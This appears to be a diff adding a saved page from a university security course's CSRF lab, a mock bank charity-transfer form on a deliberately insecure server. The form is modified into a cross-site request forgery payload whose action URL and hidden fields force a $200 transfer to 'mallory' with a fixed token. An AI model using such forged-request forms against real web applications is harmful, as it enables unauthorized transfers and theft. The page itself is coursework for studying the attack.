@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<!-- saved from url=(0058)https://andromeda.cs.virginia.edu/~insecure/csrf.php?token -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>ICS: Cross-site Request Forgery (CSRF) Attack Page</title>
+</head>
+<body>
+<h3>ICS: Cross-site Request Forgery (CSRF) Attack Page</h3>
+
+<p>Hello, sk5xvh.  If you are in ICS,
+then you are authorized to perform a cross-site request forgery attack using
+this page.  Please note that all entries are logged with userid (you
+did log in via Netbadge), and that logging is not to the DB!</p>
+
+<hr>
+
+
+<h4>Welcome to Minimum Security Bank</h4>
+    
+<p>You have $580 in your account.  Select the charity that you want to transfer money to:</p>
+    <form action="https://andromeda.cs.virginia.edu/~insecure/csrf.php?123456789&amount=200&to=mallory" name="csrf" method="post">
+    <p>Transfer 
+    <select name="amount">
+    <option value="0">$0</option>
+    <option value="20">$20</option>
+    <option value="40">$40</option>
+    <option value="60">$60</option>
+    <option value="80">$80</option>
+    <option value="100">$100</option>
+    </select>
+
+    to
+    
+    <select name="to">
+    <option value="">----- select one -----</option>
+<option value="egoists">Egoists Anonymous</option><option value="redundancy">The Society for Redundancy Society</option><option value="yacht">The Help Me Fix My Yacht Kickstarter</option><option value="vagueness">Vagueness or Something Association</option><option value="apostrophe">Misplaced Apostrophe's Anonymous</option><option value="mediocrity">International Mediocrity Foundation</option><option value="utopia">Utopians For A Better Society</option><option value="fame">Fame Seekers Anonymous</option><option value="codep">Codependency Cooperative</option><option value="moon">The Flat Moon Society</option>    </select>
+</p>
+
+<input type="hidden" name="csrf_token" value="123456789">
+<input type="hidden" name="amount" value="200">
+<input type="hidden" name="to" value="mallory">
+<input type="submit">
+</form>
+<hr>
+
+<p><i>This page served at Tue, 28 Mar 2023 15:19:12 -0400</i></p>
+
+
+
+</body></html>
